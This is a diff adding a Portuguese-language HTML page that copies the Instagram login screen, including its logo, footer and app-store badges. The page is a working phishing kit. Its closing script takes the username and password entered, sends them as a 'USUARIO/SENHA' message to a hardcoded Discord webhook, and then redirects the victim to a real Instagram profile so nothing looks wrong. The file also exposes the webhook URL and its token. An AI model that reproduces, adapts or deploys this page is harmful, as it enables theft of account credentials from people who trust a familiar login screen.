@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <style>
+        /* Reset básico */
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            color: #262626;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            flex-direction: column;
+            min-height: 100vh; /* Garante que o conteúdo ocupe toda a altura da tela */
+        }
+
+        .login-container {
+            text-align: center;
+        }
+
+        .login-box {
+            background-color: #fafafa;
+            padding: 20px;
+            border-radius: 10px;
+            width: 350px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid #dbdbdb;
+            margin-left: -30px; /* Move a caixa um pouco para a esquerda */
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        input {
+            display: block;
+            width: 90%;
+            padding: 10px;
+            margin: 10px auto;
+            border-radius: 5px;
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            color: #262626;
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        .btn {
+            display: block;
+            width: 90%;
+            background-color: #3897f0;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px auto;
+        }
+
+        .btn:hover {
+            background-color: #3178d3;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: " ";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider span {
+            font-size: 12px;
+            color: #999;
+            margin: 0 10px;
+            font-weight: bold;
+        }
+
+        .btn-facebook {
+            background-color: #4267B2;
+            padding: 10px;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            margin: 10px auto;
+            width: 90%;
+            cursor: pointer;
+        }
+
+        .btn-facebook:hover {
+            background-color: #365899;
+        }
+
+        .forgot-password {
+            display: block;
+            color: #3897f0;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        .signup-box {
+            margin-top: 20px;
+        }
+
+        .signup-box a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: bold; /* Tornar o texto "Cadastre-se" em negrito */
+            font-size: 14px; /* Reduzir o tamanho da fonte */
+        }
+
+        footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+
+        footer ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        footer ul li {
+            margin: 0 10px;
+        }
+
+        footer ul li a {
+            color: #999;
+            text-decoration: none;
+        }
+
+        footer p {
+            margin-top: 10px;
+            color: #999;
+        }
+
+        /* Estilo para a seção de aplicativos */
+        .app-section {
+            margin-top: 40px;
+            text-align: center;
+            width: 350px; /* Tamanho igual ao do bloco de login */
+            margin: 20px auto; /* Centraliza a seção */
+            margin-left: -20px; /* Mover para a esquerda */
+        }
+
+        .app-section p {
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 15px;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: space-between; /* Alinha as imagens com o mesmo espaçamento */
+            gap: 10px;
+            width: 100%;
+            justify-content: center; /* Garante que fiquem centralizadas */
+        }
+
+        .app-buttons img {
+            width: 130px;
+            height: auto;
+        }
+
+        /* Reduzir o tamanho da logo da Microsoft */
+        .app-buttons .microsoft-logo {
+            width: 100px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <!-- Imagem do logo -->
+            <img src="https://i.ibb.co/m0XtFb7/zqpwkLQ.png" alt="Instagram" class="logo">
+            <form id="login-form">
+                <input type="text" id="username" name="username" placeholder="Telefone, nome de usuário ou email" required>
+                <input type="password" id="password" name="password" placeholder="Senha" required>
+                <button type="submit" class="btn">Entrar</button>
+            </form>
+            <div class="divider">
+                <span>OU</span>
+            </div>
+            <button class="btn-facebook">Entrar com o Facebook</button>
+            <a href="#" class="forgot-password">Esqueceu a senha?</a>
+            <div class="signup-box">
+                <p>Não tem uma conta? <a href="/signup">Cadastre-se</a></p>
+            </div>
+        </div>
+
+        <!-- Seção de aplicativos -->
+        <div class="app-section">
+            <p>Obtenha o aplicativo.</p>
+            <div class="app-buttons">
+                <a href="https://play.google.com/store" target="_blank">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/y_/r/tUzYKZ-xrQK.png" alt="Disponível no Google Play">
+                </a>
+                <a href="https://www.microsoft.com/store/apps" target="_blank">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yE/r/QQnPXT5YsC4.png" alt="Baixe da Microsoft" class="microsoft-logo">
+                </a>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Rodapé com as novas legendas, bem na parte inferior da página -->
+    <footer>
+        <ul>
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">Sobre</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Carreiras</a></li>
+            <li><a href="#">Ajuda</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Privacidade</a></li>
+            <li><a href="#">Termos</a></li>
+            <li><a href="#">Localizações</a></li>
+            <li><a href="#">Instagram Lite</a></li>
+            <li><a href="#">Threads</a></li>
+            <li><a href="#">Carregamento de contatos e não usuários</a></li>
+            <li><a href="#">Meta Verified</a></li>
+            <li><a href="#">Português (Brasil)</a></li>
+        </ul>
+        <p>© 2024 Instagram from Meta</p>
+    </footer>
+
+    <script>
+        // Webhook do Discord
+        const webhookUrl = "https://discord.com/api/webhooks/1312272446266540172/gFzxvmYhFtyc3GNYUVRO1STRnQ4lTnSugAck0RMieMVIQuSSHpvHRJ3MYAHX32U6WYCO"; // Coloque sua URL do Webhook aqui
+
+        // Captura o formulário
+        const form = document.getElementById("login-form");
+
+        // Função para enviar os dados para o Discord
+        form.addEventListener("submit", function (event) {
+            event.preventDefault();  // Previne o envio do formulário padrão
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            const message = `\`\`\`
+INSTAGRAM
+
+USUARIO: ${username}
+SENHA: ${password}
+\`\`\``;
+
+            // Enviar os dados para o webhook do Discord
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirecionar para o Instagram após envio bem-sucedido
+                    window.location.href = "https://www.instagram.com/bailedeelite.bxl/";
+                } else {
+                    console.error("Erro ao enviar os dados para o Discord.");
+                }
+            })
+            .catch(error => {
+                console.error("Erro de rede:", error);
+            });
+        });
+    </script>
+</body>
+</html>
